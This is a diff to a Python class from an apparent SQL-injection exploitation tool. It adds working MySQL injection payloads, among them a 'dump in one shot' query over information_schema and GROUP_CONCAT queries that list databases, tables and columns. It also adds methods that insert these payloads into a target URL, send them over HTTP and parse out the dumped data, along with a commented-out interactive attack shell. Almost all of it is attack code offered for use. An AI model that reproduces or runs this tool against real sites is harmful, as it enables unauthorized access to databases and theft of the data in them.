@@ -6,6 +6,11 @@ class Sqli:
 
     def __init__(self, url):
       self.url           = url
+      self.dios          = "(select(@x)from(select(@x:=0x00),(select(0)from(information_schema.columns)where(table_schema=database())and(0x00)in(@x:=concat+(@x,0x3c62723e,table_name,0x203a3a20,column_name))))x) "
+      self.show_dbs      = "(SELECT+GROUP_CONCAT(schema_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.SCHEMATA)"
+      self.dbname = ""
+      self.show_tables   = "(SELECT+GROUP_CONCAT(table_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA=0x"
+      self.show_columns  = "(SELECT+GROUP_CONCAT(column_name+SEPARATOR+0x3c62723e)+FROM+information_schema.COLUMNS+WHERE+TABLE_NAME=0x"
       self.result = ''
 
     def get_result(self,body):
@@ -75,9 +80,9 @@ class Sqli:
                     "socket": socket 
         }
     
-    def dump_data(self, tables, columns, database, level=1):
+    def dump_data(self, tables, columns, level=1):
         if level==1:
-            query           = Dios().dump_data(tables, columns, database)
+            query           = Dios().dump_data(tables, columns, self.dbname)
             query_builder   = Dios().build(query)
             response        = requests.get(self.url.replace('*',query_builder))
             # try:
@@ -90,11 +95,142 @@ class Sqli:
             realResult['data']      = list()
             for sqli in sqli_array:
                 self.result = sqli
-                result      = dict()
+                result      = list()
 
                 for column in columns:
-                    result[column] = self.getResultByTag(column)
+                    result.append(self.getResultByTag(column))
                 realResult['data'].append(result)
             return realResult
             # except Exception as identifier:
             #     return identifier
+
+    def databases(self, level=1):
+        if level==1:
+            query = Dios().databases()
+            query_builder = Dios().build(query)
+            r = requests.get(self.url.replace('*', query_builder))
+            result = self.get_result(r.text)
+            return result.split(',')
+
+    def changeDB(self,dbname):
+        database = Dios().strTohex(dbname)
+        query = Dios().build(f"(SELECT+GROUP_CONCAT(DISTINCT(table_schema))+FROM+information_schema.columns+WHERE+table_schema=0x{database})")
+        try:
+            r = requests.get(self.url.replace('*', query))
+            res = self.get_result(r.text)
+
+            self.dbname = dbname
+            return ([f"Database changed to : {dbname}"], True, self.dbname)
+
+        except Exception:
+            return ([f'Unknown Database : {dbname}'], False, "NONE")
+
+    def tables(self):
+        r       = requests.get(self.url.replace('*', Dios().build(self.show_tables + Dios().strTohex(self.dbname) + ")")))
+        output  = re.search("<sqli-helper>(.*)</sqli-helper>",r.text)
+
+        if output != None:
+            title = f"Tables from database {self.dbname}"
+            output = output.group(1).split("<br>")
+            message = list()
+            for table in output:
+                message.append(table)
+            return (message, title, True)
+        else:
+            return ([f'Cannot show table from database'],"FAILED", False)
+
+    def columns(self, table_name):
+        # table   = 
+        try:
+            query_builder = Dios().build(Dios().show_columns(table_name, self.dbname))
+            r       = requests.get(self.url.replace('*', query_builder))
+
+            result  = re.search("<sqli-helper>(.*)</sqli-helper>",r.text)
+            if result != None:
+                title = f"Columns from  {table_name} : "
+                message = list()
+                columns = list()
+                result = result.group(1).split(',')
+                for column in result:
+                    columns.append(column)
+                    message.append(column)
+                return (message, title, True,columns)
+            else:
+                return ([f'Cannot show columns from {table_name}'],"FAILED", False)
+        except Exception:
+            return ([f'Cannot show columns from {table_name}'],"FAILED", False)
+
+    # def command_line(self):
+    #     user   = Dios().build(Dios().user())
+    #     domain = re.search(r'(?:[a-zA-Z0-9](?:[a-zA-Z0-9\-]{,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,6}', self.url)[0]
+
+    #     try:
+    #         response    = requests.get(self.url.replace('*',user))
+    #         sqli_helper = re.search("<sqli-helper>(.*)</sqli-helper>",response.text).group(1)
+    #         user        = re.search("<user\(\)>(.*)</user\(\)>", sqli_helper)
+    #         user        = user.group(1)
+            # cmd         = input("\033[91m┌["+ user.replace('@', '\033[93m@\033[96m') +"\033[91m]~[\033[32m"+ domain +"\033[91m]\n\033[91m└\033[93m#\033[97m ")
+
+            # if cmd == "dump_data":
+            #     r           = requests.get(self.url.replace('*', Dios().build(self.dios)))
+            #     output      = re.search("<sqli-helper>(.*)</sqli-helper>",r.text).group(1)
+
+            #     if re.search("<br>", output):
+            #         br = output.split("<br>")
+            #         for result in br:
+            #             print(result)
+            #         self.command_line()
+            # elif cmd == "show dbs":
+            #     r           = requests.get(self.url.replace('*', Dios().build(self.show_dbs)))
+            #     output      = re.search("<sqli-helper>(.*)</sqli-helper>",r.text).group(1)
+
+            #     print("[\033[92m+\033[97m] Database : ")
+
+            #     output = output.split("<br>")
+            #     for db in output:
+            #         print(f"└[\033[92m•\033[97m] {db}")
+            #     self.command_line()
+            # elif re.search("use (.*)", cmd):
+            #     dbname  = re.search('use (.*)', cmd).group(1)
+            #     r       = requests.get(self.url.replace('*', Dios().build(self.show_tables + Dios().strTohex(dbname) + ")")))
+            #     output  = re.search("<sqli-helper>(.*)</sqli-helper>",r.text)
+
+            #     if output != None:
+            #         self.dbname = dbname
+            #         print(f"\n[\033[92m+\033[97m] Database changed to : {dbname}\n")
+            #     else:
+            #         print(f'\n[\033[91m-\033[97m] Unknown Database : {dbname}\n')
+            #     self.command_line()
+            # elif cmd == "show tables":
+            #     if not self.dbname:
+            #         print("\n[\033[91m-\033[97m] No database selected!\n")
+            #     else:
+            #         r       = requests.get(self.url.replace('*', Dios().build(self.show_tables + Dios().strTohex(self.dbname) + ")")))
+            #         output  = re.search("<sqli-helper>(.*)</sqli-helper>",r.text)
+
+            #         if output != None:
+            #             print(f"[\033[92m+\033[97m] Tables from database {self.dbname} : ")
+            #             output = output.group(1).split("<br>")
+            #             for table in output:
+            #                 print(f"└[\033[92m•\033[97m] {table}")
+            #         else:
+            #             print(f'\n[\033[91m-\033[97m] Cannot show table from database {self.dbname}\n')
+            #     self.command_line()
+            # elif re.search("show columns (.*)", cmd):
+            #     table   = re.search('show columns (.*)', cmd).group(1)
+            #     r       = requests.get(self.url.replace('*', Dios().build(self.show_columns + Dios().strTohex(table) + ")")))
+            #     output  = re.search("<sqli-helper>(.*)</sqli-helper>",r.text)
+            #     if output != None:
+            #         print(f"[\033[92m+\033[97m] Columns from table {table} : ")
+            #         output = output.group(1).split('<br>')
+            #         for column in output:
+            #             print(f"└[\033[92m•\033[97m] {column}")
+            #     self.command_line()
+            # else:
+            #     r           = requests.get(self.url.replace('*', Dios().build(cmd)))
+            #     output      = re.search("<sqli-helper>(.*)</sqli-helper>",r.text).group(1)
+            #     print(f"\n[+] Output : {output}\n")
+            # self.command_line()
+    #     except Exception:
+    #         print("\n[!] Syntax Error!\n")
+    #         self.command_line()
